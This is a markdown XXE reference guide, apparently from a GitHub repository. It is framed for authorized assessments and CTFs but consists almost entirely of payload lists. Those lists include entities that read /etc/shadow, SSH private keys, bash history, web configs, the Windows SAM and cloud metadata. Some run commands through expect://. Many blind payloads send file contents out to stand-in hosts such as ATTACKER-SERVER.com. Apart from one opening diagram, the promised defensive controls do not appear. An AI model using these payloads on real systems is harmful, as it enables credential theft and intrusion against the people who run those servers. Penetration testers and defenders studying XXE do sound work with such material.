# XML External Entity (XXE) Reference Guide

A comprehensive quick-reference guide covering **XML External Entity (XXE)** injection, local file inclusion, out-of-band/blind XXE, external DTDs, entity expansion attacks, parser behavior, protocol handlers, detection techniques, and defensive controls for authorized security assessments, CTFs, and lab environments.


### How Secure XML Processing Model

```text
                  XML Input
                      |
                      v
             +----------------+
             | XML Parser     |
             |                |
             | DOCTYPE: OFF   |
             | External: OFF  |
             | Resolver: OFF  |
             +----------------+
                      |
                      v
                Validated XML
                      |
                      v
                 Application
```

---

## 1. XXE Fundamentals

### What Is XXE?

XML External Entity (XXE) occurs when an XML parser processes attacker-controlled external entities or DTD declarations.

The vulnerability generally requires:

- Attacker-controlled XML input
- A parser that processes `DOCTYPE` declarations
- External entity resolution enabled
- An application that parses the supplied XML

---

## 2. Basic XXE Payloads
```html
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///windows/win.ini" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/issue">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/apache2/error.log">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/index.php">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">]><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]><root>&test;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/boot.ini">]><data>&file;</data>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><test>&xxe;</test>
<!DOCTYPE replace [<!ENTITY example "file:///etc/passwd"> ]><userInfo><firstName>John</firstName><lastName>&example;</lastName></userInfo>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]><userInfo><firstName>John</firstName><lastName>&ent;</lastName></userInfo>
<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://ls">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.bash_history">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.bash_history">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/config/sam">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/config/system">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///usr/local/apache2/conf/httpd.conf">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/apache2/apache2.conf">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/mysql/my.cnf">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/.htaccess">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php">]><foo>&xxe;</foo>
```

## 3. Blind XXE Payloads
```html
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER-SERVER.com">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/xxe.dtd">%xxe;]><foo>test</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com">%xxe;]><foo>test</foo>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%xxe;]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com">%xxe;%param1;]>

<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/xxe">%xxe;]><foo>&send;</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;]>
<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;%send;]>
<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///c:/windows/win.ini"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;]><data>&send;</data>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net">%xxe;]>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net/xxe">%xxe;]><foo>test</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net">%xxe;]><foo>bar</foo>
<!DOCTYPE data [<!ENTITY % remote SYSTEM "http://ATTACKER-SERVER.com/ext.dtd">%remote;%init;%trick;]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/blind.dtd">%xxe;%eval;%error;]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com">%xxe;]><foo>test</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;%all;]><foo>test</foo>
<!DOCTYPE doc [<!ENTITY % oob SYSTEM "http://ATTACKER-SERVER.com/oob.xml">%oob;%external;%intern;]>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://ATTACKER-SERVER.com/xxe.dtd">%xxe;]><foo>test</foo>

<!DOCTYPE foo [<!ENTITY % p1 SYSTEM "http://ATTACKER-SERVER.com/">%p1;]>
<!DOCTYPE foo [<!ENTITY % p1 SYSTEM "http://ATTACKER-SERVER.com/x">%p1;%p2;]>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://burpcollaborator.net/x.dtd">%remote;]><foo>test</foo>
<!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;%send;]>
<!DOCTYPE doc [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/?x=%file;'>">%eval;%exfil;]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">%xxe;]>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ftp://ATTACKER-SERVER.com/xxe.dtd">%xxe;]><foo>test</foo>
<!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com:8080/evil.dtd">%dtd;%all;]>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % pe SYSTEM "http://ATTACKER-SERVER.com/param.dtd">%pe;%param;]><foo>&exfil;</foo>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/xxe?payload=test">%xxe;]>

<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://ATTACKER-SERVER.com/ext.dtd">%remote;%param1;%param2;]>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a SYSTEM "http://ATTACKER-SERVER.com">%a;]><foo>x</foo>
<!DOCTYPE data [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/combine.dtd">%dtd;]>
<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://ATTACKER-SERVER.com/xxe.dtd"><foo>test</foo>
<!DOCTYPE foo PUBLIC "-//XXE//EN" "http://ATTACKER-SERVER.com/xxe.dtd">
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/xxe">%xxe;]><request><foo>bar</foo></request>
<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///proc/self/environ"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;]>
<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///var/www/html/config.php"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/exfil.dtd">%dtd;]>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/%0a">%xxe;]><foo>test</foo>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com"><!ENTITY callhome SYSTEM "http://ATTACKER-SERVER.com/?%xxe;">]><foo>&callhome;</foo>
```

## 4. Parameters & File Access XXE Payloads
```html
<!DOCTYPE root [<!ENTITY % remote SYSTEM "file:///etc/passwd">%remote;]>
<img width="1064" height="338" alt="image" src="https://github.com/user-attachments/assets/0e4770da-8403-40ac-81d5-f624082704fb" />
<!DOCTYPE root [<!ENTITY % remote SYSTEM "file:///home/srvadmin/.bash_history">%remote;]>
<img width="1302" height="168" alt="image" src="https://github.com/user-attachments/assets/cdc4060b-fdca-42f3-aaab-eaef5247786e" />



<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/issue"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/group"> ]><foo>&xxe;</foo>

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/cpuinfo"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/apache2/error.log"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/nginx/access.log"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/nginx/error.log"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"> ]><foo>&xxe;</foo>

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/authorized_keys"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.bash_history"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/index.php"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///usr/local/apache2/conf/httpd.conf"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/apache2/apache2.conf"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/mysql/my.cnf"> ]><foo>&xxe;</foo>

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/php/7.4/apache2/php.ini"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/fstab"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/resolv.conf"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/networks"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/timezone"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/crontab"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://c:/windows/win.ini"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://c:/windows/system.ini"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://c:/windows/system32/drivers/etc/hosts"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://c:/boot.ini"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://c:/inetpub/wwwroot/web.config"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://c:/windows/php.ini"> ]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://c:/Program Files/Apache Group/Apache2/conf/httpd.conf"> ]><foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random"> ]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://ls">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/foo">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/xHELO localhost">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo>&send;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/c:/windows/win.ini">]><foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%xxe;]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;]>
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/?x=%file;'>">%eval;%exfil;]>
<!DOCTYPE data [<!ENTITY % remote SYSTEM "http://ATTACKER-SERVER.com/ext.dtd">%remote;%init;%trick;]>
<!DOCTYPE root [<!ENTITY % param1 "<!ENTITY &#x25; param2 'file:///etc/passwd'>">%param1;%param2;]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com"><!ENTITY callhome SYSTEM "http://ATTACKER-SERVER.com/?%xxe;">]>
<!DOCTYPE doc [<!ENTITY % oob SYSTEM "http://ATTACKER-SERVER.com/oob.xml">%oob;%external;]>
<!DOCTYPE test [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;]>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net">%xxe;]>
<!DOCTYPE data [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/combine.dtd">%dtd;]>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://ATTACKER-SERVER.com/ext.dtd">%remote;%param1;%param2;]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]>
<!DOCTYPE doc [<!ENTITY % file SYSTEM "file:///c:/windows/win.ini"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/?x=%file;'>">%eval;%exfil;]>
<!DOCTYPE foo [<!ENTITY % p1 SYSTEM "http://ATTACKER-SERVER.com/">%p1;]>
<!DOCTYPE foo [<!ENTITY % p1 SYSTEM "http://ATTACKER-SERVER.com/x">%p1;%p2;]>

<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///proc/self/environ"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;%send;]>
<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">%xxe;]>
<!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com:8080/evil.dtd">%dtd;%all;]>
<!DOCTYPE foo [<!ENTITY % pe SYSTEM "http://ATTACKER-SERVER.com/param.dtd">%pe;%param;]>
<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///var/www/html/config.php"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/exfil.dtd">%dtd;]>
<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/shadow"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER-SERVER.com/?data=%file;'>">%eval;%send;]>
<!DOCTYPE foo [<!ENTITY % a SYSTEM "http://ATTACKER-SERVER.com">%a;]>

<!DOCTYPE test [<!ENTITY % file SYSTEM "file:///etc/hosts"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;%exfil;]>
<!DOCTYPE root [<!ENTITY % param "<!ENTITY &#x26; exfil SYSTEM 'http://ATTACKER-SERVER.com/?data=test'>">%param;]>
<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/issue"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER-SERVER.com/%file;'>">%eval;%exfil;]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://ATTACKER-SERVER.com/xxe.dtd">%xxe;]>
<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///var/log/apache2/access.log"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/log.dtd">%dtd;]>
<!DOCTYPE data [<!ENTITY % param1 "<!ENTITY &#x25; param2 '<!ENTITY &#x26; xxe SYSTEM \"http://ATTACKER-SERVER.com\">'>">%param1;%param2;]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/xxe?payload=test">%xxe;]>
<!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/?%file;'>">%eval;%exfil;]>
<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///home/user/.ssh/id_rsa"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/ssh.dtd">%dtd;]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/%0a">%xxe;]>

<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///proc/version"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER-SERVER.com/?v=%file;'>">%eval;%send;]>
<!DOCTYPE data [<!ENTITY % wrapper "<!ENTITY &#x25; file SYSTEM 'file:///etc/passwd'>">%wrapper;%file;]>
<!DOCTYPE foo [<!ENTITY % param SYSTEM "http://ATTACKER-SERVER.com/param.xml">%param;%data;]>
<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/group"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/exfil.dtd">%dtd;%send;]>
